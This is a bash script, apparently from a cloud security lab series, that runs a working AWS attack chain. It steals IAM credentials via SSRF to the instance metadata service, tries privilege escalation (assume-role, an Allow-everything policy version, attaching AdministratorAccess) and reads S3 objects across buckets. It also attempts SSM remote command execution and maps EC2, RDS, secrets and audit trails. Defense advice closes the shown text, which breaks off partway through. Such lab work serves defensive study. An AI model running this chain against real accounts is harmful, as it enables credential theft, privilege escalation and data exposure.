#!/usr/bin/env bash
# =============================================================================
# 11_iam_privilege_escalation.sh — IAM Privilege Escalation and AWS Account Enumeration
# =============================================================================
# Purpose:
#   Using IAM credentials stolen via SSRF, explore IAM privilege escalation paths
#   and perform reconnaissance across the entire AWS account. Demonstrate how far
#   an attacker can map the environment and escalate privileges.
#
# Attack scenarios:
#   1. Steal and validate IAM credentials via IMDS
#   2. Enumerate IAM role policies (attacker discovers their own permissions)
#   3. Explore privilege escalation paths (role switching, policy modification attempts)
#   4. Account-wide S3 access (enumerate and read all buckets in the account)
#   5. SSM SendCommand attempt (remote code execution feasibility)
#   6. Cross-service reconnaissance (EC2, RDS, Secrets Manager, SSM, CloudWatch, CloudTrail)
#   7. Summary and defense recommendations
#
# Learning points:
#   - Private Subnet is a network boundary defense and cannot prevent IAM credential abuse
#   - Identical results in Config A and Config B prove this fact
#   - Enforcing IMDSv2, least-privilege principle, and SCPs are the essential defenses
#   - AmazonS3ReadOnlyAccess applies to ALL buckets in the account, not just project-specific ones
#
# Prerequisites:
#   - AWS CLI must be installed
#   - An IAM role must be attached to the EC2 instance
#   - The /fetch endpoint with SSRF vulnerability must exist
# =============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/_common.sh"

init_config

print_header "11: IAM Privilege Escalation and AWS Account Enumeration"

RESULT_FILE="11_iam_privilege_escalation.txt"
result_text=""
TARGET_URL="http://${ATTACK_TARGET}"
IMDS_BASE="http://169.254.169.254"

# API call success/denied counters
API_SUCCESS=0
API_DENIED=0
TOTAL_API_CALLS=0

record_success() {
    local msg="$1"
    ((API_SUCCESS++)) || true
    ((TOTAL_API_CALLS++)) || true
    print_vulnerable "${msg}"
    result_text+="[SUCCESS] ${msg}"$'\n'
}

record_denied() {
    local msg="$1"
    ((API_DENIED++)) || true
    ((TOTAL_API_CALLS++)) || true
    print_blocked "${msg}"
    result_text+="[DENIED] ${msg}"$'\n'
}

record_info() {
    local msg="$1"
    ((TOTAL_API_CALLS++)) || true
    print_info "${msg}"
    result_text+="[INFO] ${msg}"$'\n'
}

# =============================================================================
# Step 1: Credential theft and validation
# =============================================================================
# Retrieve the IAM role name and temporary credentials from IMDS via SSRF,
# then validate them with aws sts get-caller-identity.
# =============================================================================
print_header "Step 1: Credential Theft and Validation"

result_text+="==============================="$'\n'
result_text+="Step 1: Credential Theft and Validation"$'\n'
result_text+="==============================="$'\n'

echo -e "${BLUE}[*] Retrieving IAM role name from IMDS via SSRF${NC}"

# Retrieve IAM role name
iam_role=$(curl -sS -m 10 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/iam/security-credentials/" 2>/dev/null) || iam_role=""

if [[ -z "${iam_role}" ]] || echo "${iam_role}" | grep -qi "404\|not found\|error\|<?xml"; then
    echo -e "${YELLOW}[!] Unable to detect IAM role${NC}"

    # IMDSv2 check
    imds_check=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/" 2>/dev/null) || imds_check=""
    if echo "${imds_check}" | grep -qi "Token required\|unauthorized\|401"; then
        print_blocked "IMDSv2 enforced — IMDS access blocked from SSRF"
        result_text+="IMDSv2 enforced: SSRF access blocked"$'\n'
    elif [[ -z "${imds_check}" ]]; then
        print_info "Cannot reach IMDS or application"
        result_text+="IMDS: Unreachable"$'\n'
    else
        print_info "IMDS is accessible but no IAM role is attached"
        result_text+="IAM role: None (metadata access possible)"$'\n'
    fi

    save_result "${RESULT_FILE}" "${result_text}"
    log "IAM privilege escalation test: Exiting — no IAM role found"
    exit 0
fi

echo -e "${RED}  IAM role: ${iam_role}${NC}"
result_text+="IAM role: ${iam_role}"$'\n'

# Retrieve temporary credentials
echo -e "${BLUE}[*] Retrieving temporary credentials...${NC}"
creds_json=$(curl -sS -m 10 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/iam/security-credentials/${iam_role}" 2>/dev/null) || creds_json=""

if [[ -z "${creds_json}" ]] || ! echo "${creds_json}" | grep -qi "AccessKeyId"; then
    echo -e "${RED}[!] Failed to retrieve credentials${NC}"
    echo -e "  Response: ${creds_json:0:200}"
    result_text+="Credential retrieval: Failed"$'\n'
    save_result "${RESULT_FILE}" "${result_text}"
    exit 1
fi

# Set environment variables
export AWS_ACCESS_KEY_ID=$(echo "${creds_json}" | python3 -c "import json,sys; print(json.load(sys.stdin)['AccessKeyId'])" 2>/dev/null)
export AWS_SECRET_ACCESS_KEY=$(echo "${creds_json}" | python3 -c "import json,sys; print(json.load(sys.stdin)['SecretAccessKey'])" 2>/dev/null)
export AWS_SESSION_TOKEN=$(echo "${creds_json}" | python3 -c "import json,sys; print(json.load(sys.stdin)['Token'])" 2>/dev/null)

echo -e "${RED}  Credentials loaded into environment variables${NC}"
echo -e "  AccessKeyId: ${AWS_ACCESS_KEY_ID}"
result_text+="AccessKeyId: ${AWS_ACCESS_KEY_ID}"$'\n'

# Auto-detect region
region=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/placement/region" 2>/dev/null) || region=""
if [[ -z "${region}" ]] || echo "${region}" | grep -qi "404\|error"; then
    az_val=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/placement/availability-zone" 2>/dev/null) || az_val=""
    if [[ -n "${az_val}" ]]; then
        region="${az_val%[a-z]}"
    else
        region="ap-northeast-1"
    fi
fi
export AWS_DEFAULT_REGION="${region}"
echo -e "  Region: ${region}"
result_text+="Region: ${region}"$'\n'

# Validate with sts get-caller-identity
echo ""
echo -e "${BLUE}[*] Validating credentials: aws sts get-caller-identity${NC}"
caller_id=$(aws sts get-caller-identity --output json 2>&1) || caller_id="Failed"

if echo "${caller_id}" | grep -qi "UserId"; then
    echo "${caller_id}" | python3 -m json.tool 2>/dev/null | sed 's/^/    /' || echo "    ${caller_id}"

    account_id=$(echo "${caller_id}" | python3 -c "import json,sys; print(json.load(sys.stdin)['Account'])" 2>/dev/null || echo "unknown")
    role_arn=$(echo "${caller_id}" | python3 -c "import json,sys; print(json.load(sys.stdin)['Arn'])" 2>/dev/null || echo "unknown")
    user_id=$(echo "${caller_id}" | python3 -c "import json,sys; print(json.load(sys.stdin)['UserId'])" 2>/dev/null || echo "unknown")

    result_text+="AccountId: ${account_id}"$'\n'
    result_text+="Arn: ${role_arn}"$'\n'
    result_text+="UserId: ${user_id}"$'\n'

    record_success "Credential theft and validation succeeded — AccountId: ${account_id}"
else
    echo -e "${RED}[!] Credentials are invalid${NC}"
    echo "    ${caller_id}"
    result_text+="Credential validation: Failed — ${caller_id}"$'\n'
    save_result "${RESULT_FILE}" "${result_text}"
    exit 1
fi

echo ""

# Trap for environment variable cleanup
cleanup() {
    unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN AWS_DEFAULT_REGION 2>/dev/null || true
}
trap cleanup EXIT

# =============================================================================
# Step 2: IAM role policy enumeration
# =============================================================================
# The attacker uses stolen credentials to discover "what can I do?"
# If the policy list is retrievable, they can efficiently plan their attack.
# =============================================================================
print_header "Step 2: IAM Role Policy Enumeration"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 2: IAM Role Policy Enumeration"$'\n'
result_text+="==============================="$'\n'

# Extract role name from ARN (e.g., arn:aws:sts::123456:assumed-role/role-name/instance-id -> role-name)
extracted_role=$(echo "${role_arn}" | sed 's|.*/assumed-role/||; s|/.*||')
if [[ -z "${extracted_role}" ]] || [[ "${extracted_role}" == "${role_arn}" ]]; then
    extracted_role="${iam_role}"
fi
echo -e "${BLUE}[*] Role name: ${extracted_role}${NC}"
result_text+="Role name: ${extracted_role}"$'\n'

# Enumerate attached managed policies
echo -e "${BLUE}[*] aws iam list-attached-role-policies --role-name ${extracted_role}${NC}"
attached_policies=$(aws iam list-attached-role-policies --role-name "${extracted_role}" --output json 2>&1) || true

if echo "${attached_policies}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
    record_info "list-attached-role-policies: AccessDenied (no permission to enumerate IAM policies)"
    echo -e "  ${attached_policies}" | head -3
else
    echo "${attached_policies}" | python3 -m json.tool 2>/dev/null | sed 's/^/    /' || echo "    ${attached_policies}"

    # Retrieve details for each policy
    policy_arns=$(echo "${attached_policies}" | python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    for p in data.get('AttachedPolicies', []):
        print(p['PolicyArn'])
except:
    pass
" 2>/dev/null || true)

    policy_count=0
    while IFS= read -r parn; do
        [[ -z "${parn}" ]] && continue
        ((policy_count++)) || true
        echo -e "${BLUE}  [*] Policy details: ${parn}${NC}"
        policy_detail=$(aws iam get-policy --policy-arn "${parn}" --output json 2>&1) || true
        if echo "${policy_detail}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
            record_info "get-policy (${parn}): AccessDenied"
        else
            policy_name=$(echo "${policy_detail}" | python3 -c "import json,sys; print(json.load(sys.stdin)['Policy']['PolicyName'])" 2>/dev/null || echo "unknown")
            policy_desc=$(echo "${policy_detail}" | python3 -c "import json,sys; print(json.load(sys.stdin)['Policy'].get('Description','N/A'))" 2>/dev/null || echo "N/A")
            echo -e "    Name: ${policy_name}"
            echo -e "    Description: ${policy_desc}"
            result_text+="  Attached Policy: ${policy_name} (${parn})"$'\n'
            result_text+="    Description: ${policy_desc}"$'\n'
        fi
    done <<< "${policy_arns}"

    if [[ ${policy_count} -gt 0 ]]; then
        record_success "Enumerated ${policy_count} managed policies — attacker has full visibility of their permissions"
    fi
fi

# Enumerate inline policies
echo ""
echo -e "${BLUE}[*] aws iam list-role-policies --role-name ${extracted_role} (inline policies)${NC}"
inline_policies=$(aws iam list-role-policies --role-name "${extracted_role}" --output json 2>&1) || true

if echo "${inline_policies}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
    record_info "list-role-policies: AccessDenied (no permission to enumerate inline policies)"
else
    echo "${inline_policies}" | python3 -m json.tool 2>/dev/null | sed 's/^/    /' || echo "    ${inline_policies}"
    inline_count=$(echo "${inline_policies}" | python3 -c "import json,sys; print(len(json.load(sys.stdin).get('PolicyNames',[])))" 2>/dev/null || echo "0")
    result_text+="Inline policy count: ${inline_count}"$'\n'
    if [[ "${inline_count}" -gt 0 ]]; then
        record_success "Discovered ${inline_count} inline policies"
    else
        print_info "No inline policies found"
    fi
fi

echo ""

# =============================================================================
# Step 3: Privilege escalation path exploration
# =============================================================================
# The attacker attempts to switch to other roles, modify policies, and grant admin access.
# Even AccessDenied responses provide valuable information about what is blocked.
# =============================================================================
print_header "Step 3: Privilege Escalation Path Exploration"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 3: Privilege Escalation Path Exploration"$'\n'
result_text+="==============================="$'\n'

# 3a: Enumerate other roles
echo -e "${BLUE}[*] aws iam list-roles — Enumerate all roles in the account${NC}"
list_roles_output=$(aws iam list-roles --output json 2>&1) || true

if echo "${list_roles_output}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
    record_denied "iam list-roles: AccessDenied — cannot enumerate roles"
else
    role_names=$(echo "${list_roles_output}" | python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    roles = data.get('Roles', [])
    print(f'Total roles: {len(roles)}')
    for r in roles[:10]:
        print(f\"  {r['RoleName']} ({r['Arn']})\")
    if len(roles) > 10:
        print(f'  ...and {len(roles)-10} more')
except:
    pass
" 2>/dev/null || echo "  Parse error")
    echo "${role_names}" | sed 's/^/    /'
    result_text+="${role_names}"$'\n'
    record_success "Retrieved IAM role list for the account — attack surface mapped"

    # 3b: Attempt to assume other roles (first 5 roles)
    echo ""
    echo -e "${BLUE}[*] Attempting sts assume-role on other roles (first 5)${NC}"
    assume_targets=$(echo "${list_roles_output}" | python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    for r in data.get('Roles', [])[:5]:
        print(r['Arn'])
except:
    pass
" 2>/dev/null || true)

    while IFS= read -r target_arn; do
        [[ -z "${target_arn}" ]] && continue
        echo -e "  Attempting: assume-role ${target_arn}"
        assume_output=$(aws sts assume-role --role-arn "${target_arn}" --role-session-name "attacker-test" --output json 2>&1) || true
        if echo "${assume_output}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized\|not authorized to perform\|cannot be assumed"; then
            record_denied "assume-role ${target_arn}: AccessDenied"
        elif echo "${assume_output}" | grep -qi "Credentials"; then
            record_success "assume-role succeeded: ${target_arn} — privilege escalation path found!"
        else
            record_info "assume-role ${target_arn}: ${assume_output:0:100}"
        fi
    done <<< "${assume_targets}"
fi

# 3c: Attempt to create policy version (test if own policy can be rewritten)
echo ""
echo -e "${BLUE}[*] aws iam create-policy-version — Attempting policy rewrite${NC}"
create_pv_output=$(aws iam create-policy-version \
    --policy-arn "arn:aws:iam::${account_id}:policy/nonexistent-test-policy" \
    --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
    --set-as-default \
    --output json 2>&1) || true

if echo "${create_pv_output}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
    record_denied "create-policy-version: AccessDenied — cannot rewrite policies"
elif echo "${create_pv_output}" | grep -qi "NoSuchEntity"; then
    record_info "create-policy-version: Policy does not exist (permission itself may be granted)"
else
    record_success "create-policy-version succeeded — attacker can rewrite policies!"
fi

# 3d: Attempt to attach AdministratorAccess
echo ""
echo -e "${BLUE}[*] aws iam attach-role-policy — Attempting to attach AdministratorAccess${NC}"
attach_admin_output=$(aws iam attach-role-policy \
    --role-name "${extracted_role}" \
    --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess" \
    --output json 2>&1) || true

if echo "${attach_admin_output}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
    record_denied "attach-role-policy (AdministratorAccess): AccessDenied — cannot grant admin privileges"
else
    record_success "AdministratorAccess attached! — Full privilege escalation achieved"
    # Immediately detach (for safety)
    echo -e "${YELLOW}  [!] Detaching AdministratorAccess immediately for safety${NC}"
    aws iam detach-role-policy \
        --role-name "${extracted_role}" \
        --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess" 2>&1 || true
fi

echo ""

# =============================================================================
# Step 4: Account-wide S3 access
# =============================================================================
# AmazonS3ReadOnlyAccess grants access to ALL S3 buckets in the account.
# Not just project-specific buckets — other teams' data is also readable.
# =============================================================================
print_header "Step 4: Account-Wide S3 Access"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 4: Account-Wide S3 Access"$'\n'
result_text+="==============================="$'\n'

echo -e "${BLUE}[*] aws s3 ls — Enumerate all buckets in the account${NC}"
s3_list=$(aws s3 ls 2>&1) || true

if echo "${s3_list}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
    record_denied "s3 ls: AccessDenied — cannot enumerate buckets"
else
    bucket_count=$(echo "${s3_list}" | grep -c "^[0-9]" 2>/dev/null || echo "0")
    echo -e "  Bucket count: ${bucket_count}"
    echo "${s3_list}" | head -10 | sed 's/^/    /'
    result_text+="S3 bucket count: ${bucket_count}"$'\n'
    result_text+="${s3_list}"$'\n'

    if [[ "${bucket_count}" -gt 0 ]]; then
        record_success "Enumerated ${bucket_count} S3 buckets — AmazonS3ReadOnlyAccess applies to all buckets"

        # Enumerate contents of first 3 buckets
        echo ""
        echo -e "${BLUE}[*] Enumerating bucket contents (first 3 buckets)${NC}"
        bucket_names=$(echo "${s3_list}" | awk '{print $3}' | head -3)

        while IFS= read -r bucket; do
            [[ -z "${bucket}" ]] && continue
            echo -e "  ${BLUE}[*] s3://${bucket}${NC}"
            bucket_contents=$(aws s3 ls "s3://${bucket}" --recursive --max-items 10 --output text 2>&1) || true

            if echo "${bucket_contents}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
                record_info "s3://${bucket}: AccessDenied (restricted by bucket policy)"
            elif [[ -z "${bucket_contents}" ]]; then
                print_info "s3://${bucket}: Empty bucket"
            else
                echo "${bucket_contents}" | head -5 | sed 's/^/      /'
                result_text+="s3://${bucket} contents:"$'\n'
                result_text+="$(echo "${bucket_contents}" | head -5)"$'\n'

                # Attempt to read the first object
                first_key=$(echo "${bucket_contents}" | head -1 | awk '{print $4}')
                if [[ -n "${first_key}" ]]; then
                    echo -e "    ${BLUE}Attempting object read: s3://${bucket}/${first_key}${NC}"
                    obj_content=$(aws s3 cp "s3://${bucket}/${first_key}" - 2>&1 | head -5) || true
                    if echo "${obj_content}" | grep -qi "AccessDenied\|UnauthorizedAccess"; then
                        record_info "s3://${bucket}/${first_key}: Read AccessDenied"
                    else
                        echo "${obj_content}" | head -3 | sed 's/^/      /'
                        record_success "S3 object read succeeded: s3://${bucket}/${first_key}"
                    fi
                fi
            fi
            echo ""
        done <<< "${bucket_names}"
    else
        print_info "0 S3 buckets (no buckets exist in the account)"
    fi
fi

echo ""

# =============================================================================
# Step 5: SSM SendCommand attempt (remote code execution)
# =============================================================================
# If commands can be sent to a Private EC2 via SSM, network boundaries are
# completely bypassed and remote code execution becomes possible.
# =============================================================================
print_header "Step 5: SSM SendCommand Attempt (Remote Code Execution)"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 5: SSM SendCommand Attempt"$'\n'
result_text+="==============================="$'\n'

echo -e "${BLUE}[*] aws ssm describe-instance-information — Enumerate SSM-managed instances${NC}"
ssm_instances=$(aws ssm describe-instance-information --output json 2>&1) || true

if echo "${ssm_instances}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
    record_denied "ssm describe-instance-information: AccessDenied"
else
    instance_ids=$(echo "${ssm_instances}" | python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    instances = data.get('InstanceInformationList', [])
    for inst in instances:
        print(f\"{inst['InstanceId']} (Platform: {inst.get('PlatformName','unknown')}, Status: {inst.get('PingStatus','unknown')})\")
except:
    pass
" 2>/dev/null || echo "")

    if [[ -n "${instance_ids}" ]]; then
        echo "${instance_ids}" | sed 's/^/    /'
        result_text+="SSM-managed instances:"$'\n'
        result_text+="${instance_ids}"$'\n'
        record_success "Discovered SSM-managed instances"

        # Attempt SendCommand on the first instance
        first_instance_id=$(echo "${ssm_instances}" | python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    instances = data.get('InstanceInformationList', [])
    if instances:
        print(instances[0]['InstanceId'])
except:
    pass
" 2>/dev/null || echo "")

        if [[ -n "${first_instance_id}" ]]; then
            echo ""
            echo -e "${RED}[*] ssm send-command attempt: executing whoami on ${first_instance_id}${NC}"
            send_cmd_output=$(aws ssm send-command \
                --instance-ids "${first_instance_id}" \
                --document-name "AWS-RunShellScript" \
                --parameters 'commands=["whoami"]' \
                --output json 2>&1) || true

            if echo "${send_cmd_output}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
                record_denied "ssm send-command: AccessDenied — remote code execution blocked"
                print_info "No SSM SendCommand permission. AmazonSSMManagedInstanceCore only grants connection privileges"
            elif echo "${send_cmd_output}" | grep -qi "CommandId"; then
                cmd_id=$(echo "${send_cmd_output}" | python3 -c "import json,sys; print(json.load(sys.stdin)['Command']['CommandId'])" 2>/dev/null || echo "")
                record_success "SSM SendCommand succeeded! CommandId: ${cmd_id} — Remote code execution on Private EC2!"
                print_info "This attack completely bypasses Private Subnet network boundaries"
            else
                record_info "ssm send-command: Unexpected response — ${send_cmd_output:0:150}"
            fi
        fi
    else
        print_info "No SSM-managed instances found"
        result_text+="SSM-managed instances: 0"$'\n'
    fi
fi

echo ""

# =============================================================================
# Step 6: Cross-service reconnaissance
# =============================================================================
# Use stolen credentials to enumerate information across EC2, RDS, Secrets Manager,
# SSM Parameter Store, CloudWatch Logs, CloudTrail, and other services.
# =============================================================================
print_header "Step 6: Cross-Service Reconnaissance"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 6: Cross-Service Reconnaissance"$'\n'
result_text+="==============================="$'\n'

# 6a: Enumerate EC2 instances
echo -e "${BLUE}[*] aws ec2 describe-instances — All EC2 instance information${NC}"
ec2_output=$(aws ec2 describe-instances --output json 2>&1) || true

if echo "${ec2_output}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
    record_denied "ec2 describe-instances: AccessDenied"
else
    ec2_summary=$(echo "${ec2_output}" | python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    for res in data.get('Reservations', []):
        for inst in res.get('Instances', []):
            tags = {t['Key']:t['Value'] for t in inst.get('Tags', [])}
            name = tags.get('Name', 'N/A')
            iid = inst.get('InstanceId', 'N/A')
            state = inst.get('State', {}).get('Name', 'N/A')
            priv_ip = inst.get('PrivateIpAddress', 'N/A')
            pub_ip = inst.get('PublicIpAddress', 'N/A')
            iam_profile = inst.get('IamInstanceProfile', {}).get('Arn', 'N/A')
            sgs = ', '.join([sg['GroupName'] for sg in inst.get('SecurityGroups', [])])
            print(f'  {name} ({iid}): State={state}, PrivateIP={priv_ip}, PublicIP={pub_ip}')
            print(f'    IAM Profile: {iam_profile}')
            print(f'    Security Groups: {sgs}')
except Exception as e:
    print(f'  Parse error: {e}')
" 2>/dev/null || echo "  Parse error")
    echo "${ec2_summary}"
    result_text+="EC2 instances:"$'\n'
    result_text+="${ec2_summary}"$'\n'
    record_success "Enumerated EC2 instance info (IPs, SGs, IAM roles, and tags all exposed)"
fi

echo ""

# 6b: Enumerate RDS instances
echo -e "${BLUE}[*] aws rds describe-db-instances — All RDS instance information${NC}"
rds_output=$(aws rds describe-db-instances --output json 2>&1) || true

if echo "${rds_output}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
    record_denied "rds describe-db-instances: AccessDenied"
else
    rds_summary=$(echo "${rds_output}" | python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    for db in data.get('DBInstances', []):
        print(f\"  {db['DBInstanceIdentifier']}: Engine={db['Engine']}, Endpoint={db.get('Endpoint',{}).get('Address','N/A')}\")
        print(f\"    MasterUsername={db.get('MasterUsername','N/A')}, VpcId={db.get('DBSubnetGroup',{}).get('VpcId','N/A')}\")
        sgs = ', '.join([sg['VpcSecurityGroupId'] for sg in db.get('VpcSecurityGroups', [])])
        print(f\"    Security Groups: {sgs}\")
except Exception as e:
    print(f'  Parse error: {e}')
" 2>/dev/null || echo "  Parse error")
    echo "${rds_summary}"
    result_text+="RDS instances:"$'\n'
    result_text+="${rds_summary}"$'\n'
    record_success "Enumerated RDS instance info (endpoint, master username, VPC exposed)"
fi

echo ""

# 6c: Enumerate Secrets Manager
echo -e "${BLUE}[*] aws secretsmanager list-secrets — List all secrets${NC}"
secrets_output=$(aws secretsmanager list-secrets --output json 2>&1) || true

if echo "${secrets_output}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
    record_denied "secretsmanager list-secrets: AccessDenied"
else
    secrets_summary=$(echo "${secrets_output}" | python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    secrets = data.get('SecretList', [])
    print(f'  Total secrets: {len(secrets)}')
    for s in secrets[:5]:
        print(f\"  {s['Name']}: {s.get('Description','N/A')}\")
except Exception as e:
    print(f'  Parse error: {e}')
" 2>/dev/null || echo "  Parse error")
    echo "${secrets_summary}"
    result_text+="Secrets Manager:"$'\n'
    result_text+="${secrets_summary}"$'\n'
    if echo "${secrets_summary}" | grep -q "Total secrets: 0"; then
        print_info "Secrets Manager: No secrets found"
    else
        record_success "Retrieved Secrets Manager listing — secret names exposed"
    fi
fi

echo ""

# 6d: Enumerate SSM Parameter Store
echo -e "${BLUE}[*] aws ssm describe-parameters — List parameter store entries${NC}"
ssm_params_output=$(aws ssm describe-parameters --output json 2>&1) || true

if echo "${ssm_params_output}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
    record_denied "ssm describe-parameters: AccessDenied"
else
    ssm_params_summary=$(echo "${ssm_params_output}" | python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    params = data.get('Parameters', [])
    print(f'  Total parameters: {len(params)}')
    for p in params[:5]:
        print(f\"  {p['Name']}: Type={p['Type']}\")
except Exception as e:
    print(f'  Parse error: {e}')
" 2>/dev/null || echo "  Parse error")
    echo "${ssm_params_summary}"
    result_text+="SSM Parameters:"$'\n'
    result_text+="${ssm_params_summary}"$'\n'
    if echo "${ssm_params_summary}" | grep -q "Total parameters: 0"; then
        print_info "SSM Parameter Store: No parameters found"
    else
        record_success "Retrieved SSM Parameter Store listing — parameter names exposed"
    fi
fi

echo ""

# 6e: Enumerate CloudWatch Log Groups
echo -e "${BLUE}[*] aws logs describe-log-groups — List CloudWatch log groups${NC}"
logs_output=$(aws logs describe-log-groups --output json 2>&1) || true

if echo "${logs_output}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
    record_denied "logs describe-log-groups: AccessDenied"
else
    logs_summary=$(echo "${logs_output}" | python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    groups = data.get('logGroups', [])
    print(f'  Total log groups: {len(groups)}')
    for g in groups[:5]:
        print(f\"  {g['logGroupName']}: Stored={g.get('storedBytes',0)} bytes\")
except Exception as e:
    print(f'  Parse error: {e}')
" 2>/dev/null || echo "  Parse error")
    echo "${logs_summary}"
    result_text+="CloudWatch Log Groups:"$'\n'
    result_text+="${logs_summary}"$'\n'
    if echo "${logs_summary}" | grep -q "Total log groups: 0"; then
        print_info "CloudWatch Logs: No log groups found"
    else
        record_success "Retrieved CloudWatch log group listing — log structure exposed"
    fi
fi

echo ""

# 6f: Enumerate CloudTrail
echo -e "${BLUE}[*] aws cloudtrail describe-trails — Audit trail configuration${NC}"
ct_output=$(aws cloudtrail describe-trails --output json 2>&1) || true

if echo "${ct_output}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
    record_denied "cloudtrail describe-trails: AccessDenied"
else
    ct_summary=$(echo "${ct_output}" | python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    trails = data.get('trailList', [])
    print(f'  Total trails: {len(trails)}')
    for t in trails[:3]:
        print(f\"  {t['Name']}: S3Bucket={t.get('S3BucketName','N/A')}, IsMultiRegion={t.get('IsMultiRegionTrail',False)}\")
        print(f\"    LogFileValidation={t.get('LogFileValidationEnabled',False)}\")
except Exception as e:
    print(f'  Parse error: {e}')
" 2>/dev/null || echo "  Parse error")
    echo "${ct_summary}"
    result_text+="CloudTrail:"$'\n'
    result_text+="${ct_summary}"$'\n'
    if echo "${ct_summary}" | grep -q "Total trails: 0"; then
        print_info "CloudTrail: No audit trails (this itself is a security issue)"
    else
        record_success "Retrieved CloudTrail configuration — audit log structure exposed to attacker"
    fi
fi

echo ""

# =============================================================================
# Step 7: Summary and defense recommendations
# =============================================================================
print_header "Step 7: Summary and Defense Recommendations"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 7: Summary and Defense Recommendations"$'\n'
result_text+="==============================="$'\n'

# Calculate blast radius
if [[ ${TOTAL_API_CALLS} -gt 0 ]]; then
    blast_radius=$(( API_SUCCESS * 100 / TOTAL_API_CALLS ))
else
    blast_radius=0
fi

echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${BOLD}  IAM Privilege Escalation Test Results (${CONFIG_LABEL})${NC}"
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "  Total API calls:       ${TOTAL_API_CALLS}"
echo -e "  ${RED}Successful (VULNERABLE): ${API_SUCCESS}${NC}"
echo -e "  ${GREEN}Denied (BLOCKED):        ${API_DENIED}${NC}"
echo -e "  ${RED}Blast radius:            ${blast_radius}% of API calls succeeded${NC}"
echo ""

result_text+="Total API calls: ${TOTAL_API_CALLS}"$'\n'
result_text+="Successful (VULNERABLE): ${API_SUCCESS}"$'\n'
result_text+="Denied (BLOCKED): ${API_DENIED}"$'\n'
result_text+="Blast radius: ${blast_radius}%"$'\n'

# Core message
echo -e "${RED}${BOLD}  ============================================================${NC}"
echo -e "${RED}${BOLD}  IMPORTANT: These results are IDENTICAL for Config A and Config B${NC}"
echo -e "${RED}${BOLD}  Private Subnet provides ZERO defense against IAM credential abuse${NC}"
echo -e "${RED}${BOLD}  ============================================================${NC}"
echo ""

result_text+=$'\n'"============================================================"$'\n'
result_text+="IMPORTANT: These results are IDENTICAL for Config A and Config B"$'\n'
result_text+="Private Subnet provides ZERO defense against IAM credential abuse"$'\n'
result_text+="============================================================"$'\n'

print_info "IAM credentials are used via the AWS control plane (API)"
print_info "Network boundaries (VPC, subnets) are data plane defenses and do not protect the control plane"
print_info "An attacker can use stolen credentials from anywhere on the internet"

echo ""
echo -e "${BOLD}  Recommended Defenses:${NC}"
echo ""
echo -e "  1. ${CYAN}Enforce IMDSv2${NC} (http_tokens = 'required')"
echo -e "     -> Fundamentally blocks IMDS access from SSRF"
echo ""
echo -e "  2. ${CYAN}IAM Least Privilege Principle${NC}"
echo -e "     -> Grant only the minimum required permissions (avoid broad policies like AmazonS3ReadOnlyAccess)"
echo ""
echo -e "  3. ${CYAN}SCP (Service Control Policies)${NC}"
echo -e "     -> Restrict dangerous APIs at the organization level"
echo ""
echo -e "  4. ${CYAN}aws:SourceVpc Condition Key${NC}"
echo -e "     -> Add VPC conditions to IAM policies, allowing API calls only from specific VPCs"
echo ""
echo -e "  5. ${CYAN}Amazon GuardDuty${NC}"
echo -e "     -> Detect anomalous API call patterns (e.g., credential usage from unusual IPs)"
echo ""

result_text+=$'\n'"Recommended Defenses:"$'\n'
result_text+="1. Enforce IMDSv2 (http_tokens = 'required')"$'\n'
result_text+="2. IAM Least Privilege Principle"$'\n'
